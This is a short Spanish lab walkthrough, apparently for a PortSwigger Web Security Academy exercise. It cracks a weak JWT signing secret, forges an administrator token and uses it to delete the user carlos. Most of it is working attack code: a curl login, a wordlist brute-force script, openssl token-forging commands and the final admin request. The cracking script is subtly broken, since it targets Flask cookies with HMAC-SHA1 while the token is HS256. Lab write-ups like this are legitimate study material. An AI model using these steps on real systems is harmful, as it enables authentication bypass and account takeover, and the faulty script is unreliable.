#write up

primero nos logueamos y sacamos el token jwt
```bash
curl -X POST  -d "csrf=0d1B3PoloMc07Yv159I0zdVU9BgD14Bu" -d "username=wiener" -d "password=peter" -c cookies.txt  -v -L https://0a3100f304781a2081d8d42a00e1005c.web-security-academy.net/login

```
el token lo podemso crackear con el siguiente script de python

```python

import hmac
import hashlib
import base64
import sys

def crack_flask_session(cookie, wordlist):
    # En Flask, la cookie es: payload.timestamp.signature
    # Intentaremos recrear la firma usando el payload + timestamp + secret_key
    try:
        parts = cookie.split('.')
        if len(parts) != 3:
            print("[-] Formato de cookie no válido.")
            return

        data_to_sign = parts[0] + "." + parts[1]
        signature_to_match = parts[2]

        print(f"[*] Iniciando ataque con diccionario: {wordlist}")
        
        with open(wordlist, 'r', encoding='latin-1') as f:
            for line in f:
                secret = line.strip()
                # Flask usa una variante de HMAC-SHA1 o SHA256 dependiendo de la versión
                # Intentamos con SHA1 que es el estándar clásico de Flask
                attempt = hmac.new(secret.encode(), data_to_sign.encode(), hashlib.sha1).digest()
                attempt_b64 = base64.urlsafe_b64encode(attempt).decode().replace('=', '')

                if attempt_b64 == signature_to_match:
                    print(f"\n[+] CLAVE ENCONTRADA: {secret}")
                    return True
        
        print("\n[-] No se encontró la clave en el diccionario.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python simple_crack.py <COOKIE> <DICCIONARIO>")
    else:
        crack_flask_session(sys.argv[1], sys.argv[2])
```

la firma es secret1


ejecutamos la.iguiente linea de comandos para armar el nurvo token
 ```bash
 # Header (asegúrate de que coincida con el original)
echo -n '{"kid":"7cdf604d-fc3a-4e52-aea7-4974d38ab115","alg":"HS256"}' > header.json

# Payload (Cambiando wiener por administrator)
echo -n '{"iss":"portswigger","exp":1768169391,"sub":"administrator"}' > payload.json

# Función rápida para codificar
encode_b64url() {
  base64 | tr -d '=' | tr '+/' '-_' | tr -d '\n'
}

HEADER_B64=$(cat header.json | encode_b64url)
PAYLOAD_B64=$(cat payload.json | encode_b64url)

DATA="$HEADER_B64.$PAYLOAD_B64"
SIG_HEX=$(echo -n "$DATA" | openssl dgst -sha256 -hmac "secret1" -binary | encode_b64url)

TOKEN="$DATA.$SIG_HEX"
echo $TOKEN
```
paso a seguir nos conectamos con ese token

```bash

curl -H "Cookie:session=eyJraWQiOiI3Y2RmNjA0ZC1mYzNhLTRlNTItYWVhNy00OTc0ZDM4YWIxMTUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2ODE2OTM5MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.YobzBHJLZHbKNDIwcdwq5hAXwFcEdWFFG7ltHskouLo" "https://0ad9007704102b4a80d7fe5d00bb00d8.web-security-academy.net/admin/delete?username=carlos" -v

```

